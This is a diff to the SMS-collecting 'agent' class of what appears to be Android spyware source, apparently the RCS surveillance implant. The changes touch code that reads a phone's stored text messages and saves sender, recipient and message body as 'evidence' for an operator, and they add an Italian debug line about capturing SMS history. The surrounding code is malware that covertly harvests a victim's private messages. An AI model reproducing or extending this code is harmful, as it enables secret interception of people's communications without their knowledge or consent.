@@ -9,6 +9,7 @@
 package com.ht.RCSAndroidGUI.agent;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.Iterator;
 
 import android.accounts.Account;
@@ -31,7 +32,6 @@ import com.ht.RCSAndroidGUI.util.DateTime;
 import com.ht.RCSAndroidGUI.util.Utils;
 import com.ht.RCSAndroidGUI.util.WChar;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class MessageAgent.
  * 
@@ -55,6 +55,8 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 			return;
 		}
 
+		Log.d("QZ", TAG + " (begin): cattura sms di storico");
+		
 		SmsBrowser smsBrowser = new SmsBrowser();
 		ArrayList<Sms> listSms = smsBrowser.getSmsList();
 		Iterator<Sms> iterSms = listSms.listIterator();
@@ -137,7 +139,7 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 	}
 
 	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
-		DateTime filetime = new DateTime(date);
+		DateTime filetime = new DateTime(new Date(date));
 	
 		String from, to;
 	
@@ -163,6 +165,6 @@ public class AgentMessage extends AgentBase implements Observer<Sms> {
 		databuffer.write(Utils.padByteArray(from.getBytes(), 16));
 		databuffer.write(Utils.padByteArray(to.getBytes(), 16));
 	
-		new LogR(EvidenceType.SMS, additionalData, body);
+		new LogR(EvidenceType.SMS_NEW, additionalData, body);
 	}
 }
